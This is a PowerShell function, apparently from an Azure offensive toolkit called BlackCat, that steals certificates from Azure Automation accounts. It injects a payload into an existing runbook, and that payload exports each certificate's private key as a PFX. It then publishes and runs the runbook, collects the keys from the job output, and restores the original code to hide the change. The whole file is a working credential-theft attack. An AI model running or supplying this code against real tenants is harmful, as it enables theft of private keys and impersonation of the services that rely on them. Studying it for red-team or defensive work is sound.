function Get-AutomationCertificateKey {
    [CmdletBinding(
        SupportsShouldProcess,
        DefaultParameterSetName = 'ByName'
    )]
    param (
        [Parameter(
            Mandatory = $false,
            ValueFromPipelineByPropertyName = $true,
            ParameterSetName = 'ByName'
        )]
        [Microsoft.Azure.Commands.ResourceManager.Common.ArgumentCompleters.ResourceNameCompleterAttribute(
            'Microsoft.Automation/automationAccounts',
            'ResourceGroupName'
        )]
        [Alias('automation-account', 'account')]
        [string]$AutomationAccountName,

        [Parameter(
            Mandatory = $false,
            ValueFromPipelineByPropertyName = $true,
            ParameterSetName = 'ByName'
        )]
        [Microsoft.Azure.Commands.ResourceManager.Common.ArgumentCompleters.ResourceGroupCompleterAttribute()]
        [Alias('rg', 'resource-group')]
        [string]$ResourceGroupName,

        [Parameter(
            Mandatory = $false,
            ValueFromPipelineByPropertyName = $true
        )]
        [Alias('runbook', 'runbook-name')]
        [string]$RunbookName,

        [Parameter(
            Mandatory = $false,
            ValueFromPipelineByPropertyName = $true
        )]
        [Alias('certificate', 'cert-name')]
        [string]$CertificateName,

        [Parameter(Mandatory = $false)]
        [Alias('password', 'pfx-pwd')]
        [string]$PfxPassword = 'BlackCat-Export-2026!',

        [Parameter(Mandatory = $false)]
        [Alias('out-dir', 'path')]
        [string]$OutputDirectory = '.',

        [Parameter(Mandatory = $false)]
        [ValidateSet('Object', 'JSON', 'CSV', 'Table')]
        [Alias('output', 'o')]
        [string]$OutputFormat = 'Table'
    )

    begin {
        Write-Verbose "Starting function $($MyInvocation.MyCommand.Name)"
        $MyInvocation.MyCommand.Name | Invoke-BlackCat -ResourceTypeName 'AutomationAccount'

        $result = New-Object System.Collections.ArrayList
        $stats  = @{
            StartTime  = Get-Date
            Extracted  = 0
            Restored   = 0
            Failed     = 0
        }
    }

    process {
        try {
            $sv   = $script:SessionVariables
            $auth = $script:authHeader

            # ── 1. Discover target Automation Account(s) via Resource Graph ──
            Write-Host ' Discovering Automation Accounts via Resource Graph...' -ForegroundColor Green
            
            $queryParts = @(
                'resources'
                "| where type =~ 'microsoft.automation/automationaccounts'"
            )
            if ($AutomationAccountName) {
                $escapedAccount = $AutomationAccountName.Replace("'", "''")
                $queryParts += "| where name =~ '$escapedAccount'"
            }
            if ($ResourceGroupName) {
                $escapedRg = $ResourceGroupName.Replace("'", "''")
                $queryParts += "| where resourceGroup =~ '$escapedRg'"
            }
            $queryParts += '| project id, name, resourceGroup, subscriptionId, location'
            
            $accounts = Invoke-AzBatch -Query ($queryParts -join "`n")
            if (-not $accounts -or $accounts.Count -eq 0) {
                Write-Host '  No matching Automation Accounts found.' -ForegroundColor Yellow
                return
            }

            foreach ($acc in $accounts) {
                $accName = $acc.name
                $accRg   = $acc.resourceGroup
                $accId   = $acc.id

                Write-Host "`n[*] Automation Account: $accName (RG: $accRg)" -ForegroundColor Cyan

                # ── 2. Discover Certificates in the account via ARG ──────────
                $certQuery = @"
resources
| where type =~ 'microsoft.automation/automationaccounts/certificates'
| where id startswith '$accId/'
| project id, name, resourceGroup, thumbprint = tostring(properties.thumbprint), expiry = tostring(properties.expiryTime)
"@
                $certs = Invoke-AzBatch -Query $certQuery
                if ($CertificateName) {
                    $certs = $certs | Where-Object { $_.name -eq $CertificateName }
                }

                if (-not $certs -or $certs.Count -eq 0) {
                    Write-Host "  [-] No certificate assets found in $accName." -ForegroundColor Yellow
                    continue
                }

                # ── 3. Find an existing PowerShell Runbook to use via ARG ────
                $targetRunbook = $RunbookName
                if (-not $targetRunbook) {
                    $rbQuery = @"
resources
| where type =~ 'microsoft.automation/automationaccounts/runbooks'
| where id startswith '$accId/'
| where properties.runbookType =~ 'PowerShell' or properties.runbookType =~ 'PowerShell72'
| project id, name, runbookType = tostring(properties.runbookType), state = tostring(properties.state)
"@
                    $runbooks = Invoke-AzBatch -Query $rbQuery
                    if (-not $runbooks -or $runbooks.Count -eq 0) {
                        Write-Host "  [-] No existing PowerShell runbooks found in $accName to leverage for execution." -ForegroundColor Yellow
                        continue
                    }
                    $targetRunbook = $runbooks[0].name
                    Write-Host "  [+] Selected existing runbook for execution: $targetRunbook" -ForegroundColor White
                }

                # ── 4. Process all certificates in a single runbook execution ──
                $certNames = $certs.name
                $certListLiteral = ($certNames | ForEach-Object { "'$($_)'" }) -join ', '

                if ($PSCmdlet.ShouldProcess("$accName/$targetRunbook", "Inject extraction code to download $($certNames.Count) certificate(s)")) {
                    try {
                        # Backup original published runbook content
                        Write-Host "  [~] Backing up original content of runbook '$targetRunbook'..." -ForegroundColor White
                        $contentUri = "{0}{1}/runbooks/{2}/content?api-version=2019-06-01" -f $sv.armUri, $accId, $targetRunbook
                        
                        $originalContent = Invoke-RestMethod -Uri $contentUri -Headers $auth -Method GET -UserAgent $sv.userAgent

                        # Prepare and inject multi-certificate extraction payload
                        $injectionPayload = @"
`$certNames = @($certListLiteral)
`$results = @()
foreach (`$cName in `$certNames) {
    try {
        `$cert = Get-AutomationCertificate -Name `$cName
        if (`$cert) {
            `$bytes = `$cert.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx, '$PfxPassword')
            `$base64 = [Convert]::ToBase64String(`$bytes)
            `$results += [PSCustomObject]@{
                CertificateName = `$cName
                Base64Data      = `$base64
                Success         = `$true
            }
        }
    } catch {
        `$results += [PSCustomObject]@{
            CertificateName = `$cName
            Base64Data      = `$null
            Success         = `$false
            Error           = `$_.Exception.Message
        }
    }
}
`$json = `$results | ConvertTo-Json -Compress
Write-Output "===BLACKCAT_CERTS_START===`$json===BLACKCAT_CERTS_END==="
"@

                        Write-Host "  [+] Injecting extraction payload into draft..." -ForegroundColor White
                        $draftUri = "{0}{1}/runbooks/{2}/draft/content?api-version=2019-06-01" -f $sv.armUri, $accId, $targetRunbook
                        Invoke-RestMethod -Uri $draftUri -Headers $auth -Method PUT -Body $injectionPayload -ContentType 'text/plain' -UserAgent $sv.userAgent | Out-Null

                        Write-Host "  [+] Publishing injected runbook draft..." -ForegroundColor White
                        $publishUri = "{0}{1}/runbooks/{2}/draft/publish?api-version=2019-06-01" -f $sv.armUri, $accId, $targetRunbook
                        Invoke-RestMethod -Uri $publishUri -Headers $auth -Method POST -UserAgent $sv.userAgent | Out-Null

                        # Start runbook job and wait for output
                        $jobId = [guid]::NewGuid().ToString()
                        Write-Host "  [*] Starting job (ID: $jobId)..." -ForegroundColor White
                        $startJobUri = "{0}{1}/jobs/{2}?api-version=2019-06-01" -f $sv.armUri, $accId, $jobId
                        $jobBody = @{ properties = @{ runbook = @{ name = $targetRunbook } } } | ConvertTo-Json

                        Invoke-RestMethod -Uri $startJobUri -Headers $auth -Method PUT -Body $jobBody -ContentType 'application/json' -UserAgent $sv.userAgent | Out-Null

                        # Poll for job completion
                        $jobStatusUri = "{0}{1}/jobs/{2}?api-version=2019-06-01" -f $sv.armUri, $accId, $jobId
                        $completed = $false
                        $pollCount = 0
                        while (-not $completed -and $pollCount -lt 30) {
                            Start-Sleep -Seconds 4
                            $jobStatus = Invoke-RestMethod -Uri $jobStatusUri -Headers $auth -Method GET -UserAgent $sv.userAgent
                            $status = $jobStatus.properties.status
                            Write-Verbose "Job status: $status"
                            if ($status -in @('Completed', 'Failed', 'Suspended', 'Stopped')) {
                                $completed = $true
                            }
                            $pollCount++
                        }

                        # Retrieve job stream output
                        $jobOutputUri = "{0}{1}/jobs/{2}/output?api-version=2019-06-01" -f $sv.armUri, $accId, $jobId
                        $jobOutput = Invoke-RestMethod -Uri $jobOutputUri -Headers $auth -Method GET -UserAgent $sv.userAgent

                        if ($jobOutput -match '===BLACKCAT_CERTS_START===(.*)===BLACKCAT_CERTS_END===') {
                            $extractedJson = $Matches[1].Trim()
                            $extractedItems = @($extractedJson | ConvertFrom-Json)

                            foreach ($item in $extractedItems) {
                                $targetCertName = $item.CertificateName
                                $certMeta       = $certs | Where-Object { $_.name -eq $targetCertName } | Select-Object -First 1
                                $savedPfxPath   = Join-Path $OutputDirectory "$targetCertName.pfx"
                                $isSuccess      = $item.Success -and -not [string]::IsNullOrEmpty($item.Base64Data)

                                if ($isSuccess) {
                                    $pfxBytes = [Convert]::FromBase64String($item.Base64Data)
                                    [System.IO.File]::WriteAllBytes($savedPfxPath, $pfxBytes)
                                    Write-Host "  [+] Certificate '$targetCertName' exported to: $savedPfxPath" -ForegroundColor Green
                                    $stats.Extracted++
                                } else {
                                    Write-Warning "  [-] Failed to extract certificate '$targetCertName': $($item.Error)"
                                    $stats.Failed++
                                }

                                [void]$result.Add([PSCustomObject]@{
                                    AutomationAccount = $accName
                                    ResourceGroup     = $accRg
                                    CertificateName   = $targetCertName
                                    Thumbprint        = $certMeta.thumbprint
                                    RunbookUsed       = $targetRunbook
                                    OutputFile        = if ($isSuccess) { $savedPfxPath } else { $null }
                                    PfxPassword       = if ($isSuccess) { $PfxPassword } else { $null }
                                    Success           = $isSuccess
                                })
                            }
                        } else {
                            Write-Warning "  [-] Failed to parse certificate output payload from job."
                            $stats.Failed += $certNames.Count
                        }
                    }
                    finally {
                        # Always restore original runbook code
                        if ($originalContent) {
                            Write-Host "  [~] Restoring original runbook content..." -ForegroundColor White
                            Invoke-RestMethod -Uri $draftUri -Headers $auth -Method PUT -Body $originalContent -ContentType 'text/plain' -UserAgent $sv.userAgent | Out-Null
                            Invoke-RestMethod -Uri $publishUri -Headers $auth -Method POST -UserAgent $sv.userAgent | Out-Null
                            $stats.Restored++
                            Write-Host "  [+] Original runbook content restored & published." -ForegroundColor Green
                        }
                    }
                }
            }
        }
        catch {
            Write-Message -FunctionName $($MyInvocation.MyCommand.Name) -Message $($_.Exception.Message) -Severity 'Error'
        }
    }

    end {
        $duration = (Get-Date) - $stats.StartTime
        Write-Host "`n Automation Certificate Extraction Summary:" -ForegroundColor Magenta
        Write-Host "   Extracted : $($stats.Extracted)" -ForegroundColor Green
        Write-Host "   Restored  : $($stats.Restored)" -ForegroundColor Cyan
        Write-Host "   Failed    : $($stats.Failed)" -ForegroundColor Red
        Write-Host "   Duration  : $($duration.TotalSeconds.ToString('F2')) seconds`n" -ForegroundColor White

        switch ($OutputFormat) {
            'JSON'   { $result | ConvertTo-Json -Depth 3 }
            'CSV'    { $result | ConvertTo-Csv -NoTypeInformation }
            'Table'  { $result | Format-Table -AutoSize }
            'Object' { return $result }
        }
    }
}